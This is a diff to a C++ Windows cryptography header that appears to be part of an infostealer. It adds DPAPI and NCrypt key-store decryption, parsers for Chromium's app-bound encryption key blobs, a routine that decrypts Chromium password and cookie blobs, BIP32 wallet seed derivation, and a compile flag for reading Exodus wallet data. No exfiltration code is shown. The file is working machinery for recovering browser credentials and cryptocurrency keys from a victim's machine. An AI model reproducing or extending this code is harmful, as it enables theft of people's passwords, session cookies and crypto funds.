@@ -1,12 +1,13 @@
 #pragma once
 
-
 #include <bcrypt.h>
 #include <wincrypt.h>
+#include <ncrypt.h>
 #include <vector>
 #include <string>
 #include <cstdint>
 #include <cstring>
+#include <sstream>
 
 #if ENABLE_EXODUS
 #include <zlib.h>
@@ -14,29 +15,31 @@
 
 namespace crypto {
 
-
-inline std::string base64_decode_str(const std::string& encoded) {
-    DWORD size = 0;
-    CryptStringToBinaryA(encoded.c_str(), (DWORD)encoded.size(), CRYPT_STRING_BASE64,
-                         nullptr, &size, nullptr, nullptr);
-    std::string decoded(size, 0);
-    CryptStringToBinaryA(encoded.c_str(), (DWORD)encoded.size(), CRYPT_STRING_BASE64,
-                         (BYTE*)decoded.data(), &size, nullptr, nullptr);
-    decoded.resize(size);
-    return decoded;
-}
-
 inline std::vector<uint8_t> base64_decode(const std::string& encoded) {
     DWORD size = 0;
-    CryptStringToBinaryA(encoded.c_str(), (DWORD)encoded.size(), CRYPT_STRING_BASE64,
-                         nullptr, &size, nullptr, nullptr);
+    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
+        return {};
     std::vector<uint8_t> decoded(size);
-    CryptStringToBinaryA(encoded.c_str(), (DWORD)encoded.size(), CRYPT_STRING_BASE64,
-                         decoded.data(), &size, nullptr, nullptr);
+    if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, decoded.data(), &size, nullptr, nullptr))
+        return {};
     decoded.resize(size);
     return decoded;
 }
 
+inline std::string base64_decode_str(const std::string& encoded) {
+    auto bytes = base64_decode(encoded);
+    return std::string(bytes.begin(), bytes.end());
+}
+
+inline std::vector<uint8_t> dpapi_unprotect(const std::vector<uint8_t>& data, DWORD flags = 0) {
+    DATA_BLOB input{ (DWORD)data.size(), const_cast<BYTE*>(data.data()) };
+    DATA_BLOB output{ 0, nullptr };
+    if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, flags, &output))
+        return {};
+    std::vector<uint8_t> result(output.pbData, output.pbData + output.cbData);
+    LocalFree(output.pbData);
+    return result;
+}
 
 inline bool aes_gcm_decrypt(const uint8_t* key, size_t key_len,
                             const uint8_t* iv, size_t iv_len,
@@ -44,30 +47,25 @@ inline bool aes_gcm_decrypt(const uint8_t* key, size_t key_len,
                             const uint8_t* ciphertext, size_t ciphertext_len,
                             std::vector<uint8_t>& plaintext) {
     BCRYPT_ALG_HANDLE hAlg = nullptr;
-    BCRYPT_KEY_HANDLE hKey = nullptr;
-
     if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
         return false;
-
     if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
             (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
         return false;
     }
-
+    BCRYPT_KEY_HANDLE hKey = nullptr;
     if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
             (PUCHAR)key, (ULONG)key_len, 0))) {
         BCryptCloseAlgorithmProvider(hAlg, 0);
         return false;
     }
-
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
     BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
     authInfo.pbNonce = (PUCHAR)iv;
     authInfo.cbNonce = (ULONG)iv_len;
     authInfo.pbTag = (PUCHAR)auth_tag;
     authInfo.cbTag = (ULONG)auth_len;
-
     plaintext.resize(ciphertext_len);
     ULONG bytesDecrypted = 0;
     NTSTATUS status = BCryptDecrypt(hKey,
@@ -75,10 +73,8 @@ inline bool aes_gcm_decrypt(const uint8_t* key, size_t key_len,
         &authInfo, nullptr, 0,
         plaintext.data(), (ULONG)plaintext.size(),
         &bytesDecrypted, 0);
-
     BCryptDestroyKey(hKey);
     BCryptCloseAlgorithmProvider(hAlg, 0);
-
     if (!BCRYPT_SUCCESS(status)) {
         plaintext.clear();
         return false;
@@ -87,39 +83,202 @@ inline bool aes_gcm_decrypt(const uint8_t* key, size_t key_len,
     return true;
 }
 
+inline std::vector<uint8_t> aes_gcm_decrypt_vec(const std::vector<uint8_t>& key,
+                                                  const std::vector<uint8_t>& iv,
+                                                  const std::vector<uint8_t>& ciphertext,
+                                                  const std::vector<uint8_t>& tag) {
+    std::vector<uint8_t> plaintext;
+    if (!aes_gcm_decrypt(key.data(), key.size(), iv.data(), iv.size(),
+            tag.data(), tag.size(), ciphertext.data(), ciphertext.size(), plaintext))
+        return {};
+    return plaintext;
+}
+
+inline bool chacha20_poly1305_decrypt(const uint8_t* key, size_t key_len,
+                                       const uint8_t* iv, size_t iv_len,
+                                       const uint8_t* auth_tag, size_t auth_len,
+                                       const uint8_t* ciphertext, size_t ciphertext_len,
+                                       std::vector<uint8_t>& plaintext) {
+    BCRYPT_ALG_HANDLE hAlg = nullptr;
+    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, nullptr, 0)))
+        return false;
+    BCRYPT_KEY_HANDLE hKey = nullptr;
+    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0,
+            (PUCHAR)key, (ULONG)key_len, 0))) {
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return false;
+    }
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+    authInfo.pbNonce = (PUCHAR)iv;
+    authInfo.cbNonce = (ULONG)iv_len;
+    authInfo.pbTag = (PUCHAR)auth_tag;
+    authInfo.cbTag = (ULONG)auth_len;
+    plaintext.resize(ciphertext_len);
+    ULONG bytesDecrypted = 0;
+    NTSTATUS status = BCryptDecrypt(hKey,
+        (PUCHAR)ciphertext, (ULONG)ciphertext_len,
+        &authInfo, nullptr, 0,
+        plaintext.data(), (ULONG)plaintext.size(),
+        &bytesDecrypted, 0);
+    BCryptDestroyKey(hKey);
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (!BCRYPT_SUCCESS(status)) {
+        plaintext.clear();
+        return false;
+    }
+    plaintext.resize(bytesDecrypted);
+    return true;
+}
+
+inline std::vector<uint8_t> chacha20_poly1305_decrypt_vec(const std::vector<uint8_t>& key,
+                                                            const std::vector<uint8_t>& iv,
+                                                            const std::vector<uint8_t>& ciphertext,
+                                                            const std::vector<uint8_t>& tag) {
+    std::vector<uint8_t> plaintext;
+    if (!chacha20_poly1305_decrypt(key.data(), key.size(), iv.data(), iv.size(),
+            tag.data(), tag.size(), ciphertext.data(), ciphertext.size(), plaintext))
+        return {};
+    return plaintext;
+}
+
+inline std::vector<uint8_t> ncrypt_decrypt(const std::vector<uint8_t>& input, const std::wstring& key_name) {
+    NCRYPT_PROV_HANDLE hProvider{};
+    if (NCryptOpenStorageProvider(&hProvider, MS_KEY_STORAGE_PROVIDER, 0) != ERROR_SUCCESS)
+        return {};
+    NCRYPT_KEY_HANDLE hKey{};
+    if (NCryptOpenKey(hProvider, &hKey, key_name.c_str(), 0, 0) != ERROR_SUCCESS) {
+        NCryptFreeObject(hProvider);
+        return {};
+    }
+    DWORD cbResult = 0;
+    if (NCryptDecrypt(hKey, const_cast<BYTE*>(input.data()), (DWORD)input.size(),
+            nullptr, nullptr, 0, &cbResult, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS) {
+        NCryptFreeObject(hKey);
+        NCryptFreeObject(hProvider);
+        return {};
+    }
+    std::vector<uint8_t> decrypted(cbResult);
+    if (NCryptDecrypt(hKey, const_cast<BYTE*>(input.data()), (DWORD)input.size(),
+            nullptr, decrypted.data(), cbResult, &cbResult, NCRYPT_SILENT_FLAG) != ERROR_SUCCESS) {
+        NCryptFreeObject(hKey);
+        NCryptFreeObject(hProvider);
+        return {};
+    }
+    decrypted.resize(cbResult);
+    NCryptFreeObject(hKey);
+    NCryptFreeObject(hProvider);
+    return decrypted;
+}
+
+inline std::vector<uint8_t> byte_xor(const std::vector<uint8_t>& a, const std::vector<uint8_t>& b) {
+    size_t len = (std::min)(a.size(), b.size());
+    std::vector<uint8_t> result(len);
+    for (size_t i = 0; i < len; i++)
+        result[i] = a[i] ^ b[i];
+    return result;
+}
 
 inline std::string decrypt_chromium_blob(const uint8_t* key, size_t key_len,
                                          const uint8_t* data, size_t data_len) {
-    if (data_len < 3 + 12 + 16) return "";
+    if (data_len < 15 || key_len == 0) return "";
+    if (data_len >= 4 && data[0] == 0x01 && data[1] == 0x00 &&
+        data[2] == 0x00 && data[3] == 0x00) {
+        std::vector<uint8_t> blob(data, data + data_len);
+        auto dec = dpapi_unprotect(blob, CRYPTPROTECT_UI_FORBIDDEN);
+        if (!dec.empty())
+            return std::string(dec.begin(), dec.end());
+        return "";
+    }
     const uint8_t* iv = data + 3;
-    size_t ct_len = data_len - 3 - 12 - 16;
+    size_t payload_len = data_len - 15;
+    if (payload_len < 16) return "";
+    size_t ct_len = payload_len - 16;
     const uint8_t* ciphertext = data + 15;
     const uint8_t* tag = data + data_len - 16;
-
     std::vector<uint8_t> plaintext;
     if (!aes_gcm_decrypt(key, key_len, iv, 12, tag, 16, ciphertext, ct_len, plaintext))
         return "";
+    while (!plaintext.empty() && (plaintext.back() == 0 || plaintext.back() == '\r' || plaintext.back() == '\n'))
+        plaintext.pop_back();
     return std::string(plaintext.begin(), plaintext.end());
 }
 
+struct KeyBlob {
+    std::vector<uint8_t> header;
+    uint8_t flag = 0;
+    std::vector<uint8_t> iv;
+    std::vector<uint8_t> ciphertext;
+    std::vector<uint8_t> tag;
+    std::vector<uint8_t> encrypted_aes_key;
+};
+
+struct KeyBlob2 {
+    std::vector<uint8_t> blob1;
+    std::vector<uint8_t> blob2;
+};
+
+inline KeyBlob parse_key_blob(const std::vector<uint8_t>& data) {
+    KeyBlob kb;
+    if (data.size() < 9) return kb;
+    size_t offset = 0;
+    DWORD header_len = *(const DWORD*)&data[offset]; offset += 4;
+    if (offset + header_len > data.size()) return kb;
+    kb.header.assign(data.begin() + offset, data.begin() + offset + header_len);
+    offset += header_len;
+    if (offset + 4 > data.size()) return kb;
+    DWORD content_len = *(const DWORD*)&data[offset]; offset += 4;
+    if (header_len + content_len + 8 != data.size()) return kb;
+    kb.flag = data[offset++];
+    if (kb.flag == 1 || kb.flag == 2) {
+        if (offset + 12 > data.size()) return kb;
+        kb.iv.assign(data.begin() + offset, data.begin() + offset + 12); offset += 12;
+        if (offset + 32 > data.size()) return kb;
+        kb.ciphertext.assign(data.begin() + offset, data.begin() + offset + 32); offset += 32;
+        if (offset + 16 > data.size()) return kb;
+        kb.tag.assign(data.begin() + offset, data.begin() + offset + 16);
+    } else if (kb.flag == 3) {
+        if (offset + 32 > data.size()) return kb;
+        kb.encrypted_aes_key.assign(data.begin() + offset, data.begin() + offset + 32); offset += 32;
+        if (offset + 12 > data.size()) return kb;
+        kb.iv.assign(data.begin() + offset, data.begin() + offset + 12); offset += 12;
+        if (offset + 32 > data.size()) return kb;
+        kb.ciphertext.assign(data.begin() + offset, data.begin() + offset + 32); offset += 32;
+        if (offset + 16 > data.size()) return kb;
+        kb.tag.assign(data.begin() + offset, data.begin() + offset + 16);
+    }
+    return kb;
+}
+
+inline KeyBlob2 parse_key_blob2(const std::vector<uint8_t>& data) {
+    KeyBlob2 kb;
+    if (data.size() < 8) return kb;
+    size_t offset = 0;
+    DWORD blob1_len = *(const DWORD*)&data[offset]; offset += 4;
+    if (blob1_len > data.size() - offset) return kb;
+    kb.blob1.assign(data.begin() + offset, data.begin() + offset + blob1_len);
+    offset += blob1_len;
+    if (offset + 4 > data.size()) return kb;
+    DWORD blob2_len = *(const DWORD*)&data[offset]; offset += 4;
+    if (blob2_len > data.size() - offset) return kb;
+    kb.blob2.assign(data.begin() + offset, data.begin() + offset + blob2_len);
+    return kb;
+}
 
 class SHA256 {
 public:
     static const size_t DIGEST_SIZE = 32;
-
     void init() {
         h_[0] = 0x6a09e667; h_[1] = 0xbb67ae85; h_[2] = 0x3c6ef372; h_[3] = 0xa54ff53a;
         h_[4] = 0x510e527f; h_[5] = 0x9b05688c; h_[6] = 0x1f83d9ab; h_[7] = 0x5be0cd19;
         bitlen_ = 0; datalen_ = 0;
     }
-
     void update(const uint8_t* data, size_t len) {
         for (size_t i = 0; i < len; ++i) {
             buf_[datalen_++] = data[i];
             if (datalen_ == 64) { transform(); bitlen_ += 512; datalen_ = 0; }
         }
     }
-
     void finalize(uint8_t* out) {
         if (datalen_ < 56) {
             buf_[datalen_++] = 0x80;
@@ -138,7 +297,6 @@ public:
             out[i*4+2] = (h_[i] >> 8) & 0xff;  out[i*4+3] = h_[i] & 0xff;
         }
     }
-
 private:
     uint32_t h_[8]; uint64_t bitlen_; size_t datalen_; uint8_t buf_[64];
     static uint32_t rotr(uint32_t x, int n) { return (x >> n) | (x << (32 - n)); }
@@ -179,11 +337,9 @@ inline void sha256(const uint8_t* data, size_t len, uint8_t* out) {
     SHA256 ctx; ctx.init(); ctx.update(data, len); ctx.finalize(out);
 }
 
-
 class SHA512 {
 public:
     static const size_t DIGEST_SIZE = 64;
-
     void init() {
         h_[0]=0x6a09e667f3bcc908ULL; h_[1]=0xbb67ae8584caa73bULL;
         h_[2]=0x3c6ef372fe94f82bULL; h_[3]=0xa54ff53a5f1d36f1ULL;
@@ -191,14 +347,12 @@ public:
         h_[6]=0x1f83d9abfb41bd6bULL; h_[7]=0x5be0cd19137e2179ULL;
         bitlen_ = 0; datalen_ = 0;
     }
-
     void update(const uint8_t* data, size_t len) {
         for (size_t i = 0; i < len; ++i) {
             buf_[datalen_++] = data[i];
             if (datalen_ == 128) { transform(); bitlen_ += 1024; datalen_ = 0; }
         }
     }
-
     void finalize(uint8_t* out) {
         if (datalen_ < 112) {
             buf_[datalen_++] = 0x80;
@@ -219,7 +373,6 @@ public:
             out[i*8+6]=(h_[i]>>8)&0xff;  out[i*8+7]=h_[i]&0xff;
         }
     }
-
 private:
     uint64_t h_[8]; uint64_t bitlen_; size_t datalen_; uint8_t buf_[128];
     static uint64_t rotr(uint64_t x, int n) { return (x >> n) | (x << (64 - n)); }
@@ -275,7 +428,6 @@ inline void sha512(const uint8_t* data, size_t len, uint8_t* out) {
     SHA512 ctx; ctx.init(); ctx.update(data, len); ctx.finalize(out);
 }
 
-
 inline void hmac_sha512(const uint8_t* key, size_t key_len,
                         const uint8_t* data, size_t data_len, uint8_t* out) {
     uint8_t ipad[128] = {0}, opad[128] = {0}, key_buf[128] = {0};
@@ -288,7 +440,6 @@ inline void hmac_sha512(const uint8_t* key, size_t key_len,
     ctx.init(); ctx.update(opad, 128); ctx.update(inner, 64); ctx.finalize(out);
 }
 
-
 inline void bip32_master_from_seed(const uint8_t* seed, size_t seed_len,
                                    uint8_t* master_priv, uint8_t* chain_code) {
     uint8_t out[64];
@@ -297,7 +448,6 @@ inline void bip32_master_from_seed(const uint8_t* seed, size_t seed_len,
     memcpy(master_priv, out, 32);
     memcpy(chain_code, out + 32, 32);
 }
-
 
 inline uint32_t sha256_checksum_bits(const std::vector<uint8_t>& data, int bits) {
     uint8_t hash[32];
@@ -313,28 +463,21 @@ inline uint32_t sha256_checksum_bits(const std::vector<uint8_t>& data, int bits)
 }
 
 #if ENABLE_EXODUS
-
 inline bool inflate_gzip(const std::vector<uint8_t>& compressed,
                          std::vector<uint8_t>& decompressed) {
     if (compressed.size() < 5) return false;
-
     const uint8_t* gzip_data = compressed.data() + 4;
     size_t gzip_len = compressed.size() - 4;
-
     if (gzip_len < 2 || gzip_data[0] != 0x1F || gzip_data[1] != 0x8B)
         return false;
-
     z_stream strm = {0};
     strm.next_in = (Bytef*)gzip_data;
     strm.avail_in = (uInt)gzip_len;
-
     if (inflateInit2(&strm, 15 + 16) != Z_OK) return false;
-
     size_t out_size = gzip_len * 4;
     decompressed.resize(out_size);
     strm.next_out = decompressed.data();
     strm.avail_out = (uInt)out_size;
-
     int ret = inflate(&strm, Z_FINISH);
     if (ret == Z_BUF_ERROR && strm.avail_out == 0) {
         out_size *= 4;
@@ -343,18 +486,15 @@ inline bool inflate_gzip(const std::vector<uint8_t>& compressed,
         strm.avail_out = (uInt)(out_size - strm.total_out);
         ret = inflate(&strm, Z_FINISH);
     }
-
     if (ret == Z_STREAM_END) {
         decompressed.resize(strm.total_out);
         inflateEnd(&strm);
         return true;
     }
-
     inflateEnd(&strm);
     return false;
 }
 #endif
-
 
 inline std::string url_decode(const std::string& encoded) {
     std::string decoded;
